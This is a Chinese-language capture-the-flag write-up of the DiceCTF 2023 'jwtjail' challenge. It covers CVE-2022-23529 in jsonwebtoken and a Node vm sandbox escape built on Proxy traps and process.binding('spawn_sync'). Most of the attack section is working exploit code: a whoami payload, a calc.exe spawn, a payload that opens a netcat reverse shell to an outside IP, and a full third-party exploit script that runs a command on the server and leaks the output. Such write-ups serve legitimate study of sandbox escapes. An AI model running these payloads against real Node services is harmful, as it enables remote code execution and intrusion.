---
tags: 
  - JWT
  - Node VM 逃逸
  - JS Proxy
---

# jwtjail

## 背景

题目背景是 [CVE-2022-23529](https://cve.report/CVE-2022-23529)。在 `jsonwebtoken < 9.0.0` 中，对于`jwt.verify` 的 `secretOrPublicKey` 参数如果能够控制那么可以覆写其 toString 方法达成恶意利用。其漏洞点在于：
```js
if (!options.algorithms) { // undefined
  options.algorithms = ~secretOrPublicKey.toString().indexOf('BEGIN CERTIFICATE') || 
	~secretOrPublicKey.toString().indexOf('BEGIN PUBLIC KEY') ? PUB_KEY_ALGS :
	~secretOrPublicKey.toString().indexOf('BEGIN RSA PUBLIC KEY') ? RSA_KEY_ALGS : HS_ALGS;
}
```
CVE Payload：
```js
const jwt = require('jsonwebtoken');  // version < 9.0.0
token = jwt.sign({},"foo");
obj = { 
  toString : ()=> {
    console.log(require('child_process').execSync("whoami").toString());  
    process.exit(0)  
  }
};
jwt.verify(token,obj);
```

## VM 逃逸

但在新版本中，在漏洞点之前加入了对于 secretOrPublicKey 的检验，并取消了 toString 调用，题目环境也是 9.0.0 无漏洞版本。而且对于前面还套了一个 vm 模块。

首先是vm逃逸，其主要思路就是获得到一个沙箱外的对象。

写一些拿沙箱外对象的方法：

- 没有其他 ctx 限制下 `this` 拿的就是一个沙箱外的对象引用。 
- 直接获取 ctx 中的引用对象，类似数字，布尔的值传递不行。
- sandbox 为 null 时可以考虑用 `arguments.callee.caller` 拿函数的调用者，沙箱对象在外部调用时显然是外部的作用域。
- 同上，也可以写 Proxy 对象来劫持属性从而触发。

拿到了对象，下一步便是利用，可以直接使用 `p=obj.constructor.constructor('return process')()` 拿到 process 对象，攻击载荷就是 `p.mainModule.require('child_process').execSync('whoami').toString()`。

其中 mainModule 能够获取关联进程的主模块信息，然后执行 shell。

再来看看题目：题目中的 `Object.create(null)` 让我们不能直接用 `this` 获取沙箱外的对象；strict mode 使我们不能够使用 `arguments.callee.caller` 拿函数的调用者，所以唯一的想法是构造 Proxy。在 Proxy 对象中有很多代理方法，但是需要找到一个代理方法的函数参数是引用传递。

可以看到在 `Proxy#apply` 的参数中有一个 `argArray` 数组引用类型，符合利用要求；除此之外还有 `construct` 的 `argumentsList` 也是引用数组。能够找到一个 `[Symbol.toPrimitive]` 方法满足调用 apply 的条件，而该方法可以在模板字符串中触发。

另一个绕过点在于 `process.mainModule = null`，无法通过此拿到 module，但是可以通过 `process.binding` 拿到 Internal Binding，即内建的 CPP 模块。`process.moduleLoadList` 列出了所有 module 和 binding。

查阅源码可以得到对于 `spawn_sync` 的利用，其实际是 `child_process.spawnSync` 的内部实现，所以 Proxy 部分的 Payload 便是:

```js
const o = {
    [Symbol.toPrimitive]: new Proxy(_ => _, {
        apply(target, thisArg, argArray) {
            const proc = argArray.constructor.constructor("return process")();
            //return proc.mainModule.require("child_process").execSync('whoami').toString()
            process
                .binding('spawn_sync')
                .spawn({
                    args: [ 'cmd', '/c', "calc.exe" ],
                    file: 'C:\\Windows\\System32\\cmd.exe',
                    stdio: [
                        { type: 'pipe', readable: true, writable: false }
                    ]
                }).output[1].toString().trim()
        }
    })
}

console.log(`${o}`)
```

看 `test-process-binding-internalbinding-allowlist.js` 可以得到除了 `spawn_sync` binding 外，`fs`， `zlib` 等也可以调用。

## 触发点

接下来便是寻找触发点。

模板字符串在 node 源码中几乎无处不在，比如 `node/blob/v16.18.1/lib/internal/errors.js#L1183` 中的错误 `ERR_INVALID_ARG_TYPE`，将第三个参数传入了 `determineSpecificType`，若其为 object，则使用模板字符串嵌入 `constructor.name` ，即调用 `Symbol.toPrimitive` 。
所以这题的触发点可以是这个 `key.js#L581`。

```js
// key.js
if (typeof key !== 'string' &&
    !isArrayBufferView(key) &&
    !isAnyArrayBuffer(key)) {
  throw new ERR_INVALID_ARG_TYPE(
    'key',
    getKeyTypes(!bufferOnly, bufferOnly),
    key);
}

// node/blob/v16.18.1/lib/internal/errors.js#L874
if (typeof value === 'object') {
    if (value.constructor?.name) {
      return `an instance of ${value.constructor.name}`;
    }
  ...
}
```

所以命令执行的 Payload 是：
```js
const script2 = `
{
    constructor: {
        name: {
            [Symbol.toPrimitive]: new Proxy(_ => _, {
                apply: (...args) => {
                    const process = args[2].constructor.constructor('return process')()
                    process
                        .binding('spawn_sync')
                        .spawn({
                            args: [ "nc","IP","9001","-e","/bin/sh" ],
                            file: 'nc',
                            stdio: [
                                { type: 'pipe', readable: true, writable: false }
                            ]
                        })
                }
            })
        }
    }
}`

fetch(endpoint + `/api/verify`, {
    method: 'POST',
    headers: {
        'Content-Type': 'application/x-www-form-urlencoded'
    },
    body: new URLSearchParams({
        token: `'${token}'`,
        secretOrPrivateKey: script2
    })
})
    .then((res) => res.text())
    .then(console.log)
```


当然从 r3 师傅那里学的如果环境不出网，可以顺便把 `toJSON` 方法给覆盖了从而完成回显得到信息。
Exp From r3

```js
import jwt from 'jsonwebtoken';
import fetch from "node-fetch";
const endpoint = `http://localhost:12345`

const token = jwt.sign({}, 'a')

fetch(endpoint + `/api/verify`, {
    method: 'POST',
    headers: {
        'Content-Type': 'application/x-www-form-urlencoded'
    },
    body: new URLSearchParams({
        token: `'${token}'`,
        secretOrPrivateKey: `
(() => {
  const c = (name, tar = {}) => new Proxy(
    tar,
    {
      apply: (...args) => {
        try {
          const process = args[2].constructor.constructor.constructor('return process')()
          const Buffer = args[2].constructor.constructor.constructor('return Buffer')()
          const flag = process
            .binding('spawn_sync')
            .spawn({
              maxBuffer: 1048576,
              shell: true,
              args: [ '/bin/sh', '-c', "/readflag" ],
              cwd: undefined,
              detached: false,
              envPairs: ['PWD=/'],
              file: '/bin/sh',
              windowsHide: false,
              windowsVerbatimArguments: false,
              killSignal: undefined,
              stdio: [
                { type: 'pipe', readable: true, writable: false },
                { type: 'pipe', readable: false, writable: true },
                { type: 'pipe', readable: false, writable: true }
              ]
            }).output[1].toString().trim()
          console.log(flag)
          process.__proto__.__proto__.__proto__.constructor.prototype.toJSON =
            () => flag
        } catch (e) {
          console.log(e.stack)
        }
      },
      get: (...args) => {
        if(args[1] === Symbol.toPrimitive) {
          return c(name + '.' + String(args[1]), () => {
            throw new Error()
          });
        }
        return c(name + '.' + String(args[1]));
      }
    }
  );
  return c('a', {});
})()`
    })
})
    .then((res) => res.text())
    .then(console.log)

```

## Ref
- r3
- [官方](https://brycec.me/posts/dicectf_2023_challenges#jwtjail)
- [JS Proxy](https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Proxy)
- [Proxy 和 Reflect](https://juejin.cn/post/6844904090116292616)
- [Node 知识点](https://xz.aliyun.com/t/11791)
- [Process.binding](https://zhuanlan.zhihu.com/p/413313125)
